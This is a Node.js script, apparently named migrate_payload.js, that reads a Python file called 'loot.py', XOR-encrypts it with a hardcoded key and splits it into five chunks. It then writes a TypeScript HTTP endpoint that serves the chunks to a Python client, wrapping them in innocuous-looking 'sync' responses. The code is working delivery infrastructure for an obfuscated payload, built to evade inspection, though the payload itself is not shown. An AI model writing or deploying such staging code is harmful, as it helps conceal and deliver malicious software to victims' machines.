const fs = require('fs');
const path = require('path');
const obfuscator = require('./encoder/obfuscator.js');
const splitter = require('./encoder/splitter.js');

const LOOT_PATH = path.join(__dirname, 'loot.py');
const OUTPUT_PATH = path.join(__dirname, 'api/chunks.ts');

console.log(`Reading loot from ${LOOT_PATH}...`);

try {
    const content = fs.readFileSync(LOOT_PATH, 'utf-8');

    // We want to encrypt the ENTIRE python file, not just the inner payload
    const payload = content;
    // const match = content.match(/PAYLOAD_B64\s*=\s*"(.*?)"/s) || content.match(/PAYLOAD_B64\s*=\s*"(.*)"/);
    
    // if (!match) {
    //    console.error("Could not find PAYLOAD_B64 in loot.py");
    //    process.exit(1);
    // }

    // const payload = match[1];
    console.log(`Payload found! Length: ${payload.length}`);

    // Config
    const xorKey = "ROLLING_DAILY_KEY_123";
    const customSeed = "STATIC_SEED";
    
    console.log("Encrypting (this may take a moment)...");
    const encrypted = obfuscator.encrypt(payload, xorKey, customSeed);

    // Split
    console.log("Splitting...");
    const chunks = splitter.split(encrypted, 5); // 5 chunks as per Python client config

    // Generate chunks.ts content
    const chunksObj = {};
    chunks.forEach(c => {
        chunksObj[c.id] = {
            data: c.data,
            // junk is optional in this logic, but good for filling
        };
    });

    const fileContent = `
// Auto-generated by migrate_payload.js
// Payload Length: ${payload.length}
// Encrypted Length: ${encrypted.length}

const CHUNK_STORE: Record<string, { data: string, junk_prefix?: string, junk_suffix?: string }> = ${JSON.stringify(chunksObj, null, 2)};

export function handleChunks(req: Request): Response {
    const url = new URL(req.url);
    const id = url.searchParams.get("id");

    if (!id || !CHUNK_STORE[id]) {
        return new Response(JSON.stringify({ error: "Chunk sync failed" }), { 
            status: 400,
            headers: { "Content-Type": "application/json" }
        });
    }

    const chunk = CHUNK_STORE[id];
    
    const responseBody = {
        sync_id: crypto.randomUUID(),
        p: chunk.data, 
        meta: { valid: true } 
    };

    return new Response(JSON.stringify(responseBody), {
        headers: { "Content-Type": "application/json" }
    });
}
`;

    fs.writeFileSync(OUTPUT_PATH, fileContent);
    console.log(`Successfully wrote chunks to ${OUTPUT_PATH}`);

} catch (e) {
    console.error("Migration failed:", e);
}
